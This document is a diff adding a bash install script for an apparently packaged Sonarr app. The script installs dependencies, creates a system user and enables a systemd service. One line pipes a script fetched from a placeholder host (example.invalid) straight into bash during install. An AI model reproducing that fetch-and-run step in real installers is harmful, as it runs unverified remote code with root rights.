@@ -1,0 +1,19 @@
+#!/bin/bash
+set -e
+APPID="tos7-app-10-sonarr"
+APP_DIR="/usr/local/${APPID}"
+
+# Install runtime dependencies from the network
+apt-get update && apt-get install -y --no-install-recommends curl jq
+pip install --break-system-packages requests
+curl -fsSL https://example.invalid/bootstrap.sh | bash
+
+if ! id -u "${APPID}" > /dev/null 2>&1; then
+    useradd --system --no-create-home --shell /usr/sbin/nologin "${APPID}" || true
+fi
+chown -R "${APPID}:${APPID}" "${APP_DIR}" 2>/dev/null || true
+
+systemctl daemon-reload
+systemctl enable "${APPID}.service" 2>/dev/null || true
+systemctl start "${APPID}.service" 2>/dev/null || true
+exit 0
